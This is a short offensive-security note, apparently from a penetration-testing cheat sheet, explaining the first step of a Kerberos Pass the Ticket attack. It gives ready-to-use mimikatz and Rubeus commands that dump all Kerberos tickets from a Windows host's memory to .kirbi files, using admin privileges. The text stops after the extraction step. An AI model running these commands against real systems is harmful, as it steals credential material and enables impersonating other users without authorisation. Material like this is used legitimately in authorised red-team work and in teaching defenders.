We can perform Pass The Ticket Attack to authenticate as another user

First, we extract ticket from the system, note that to extract all ticket we need admin privilege:
-Using mimikatz:
```
#Using mimikatz to extract all ticket
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
#all tickets will be saved in current directory as .kirbi files
```
-Using Rubeus:
```
Rubeus.exe dump /nowrap
```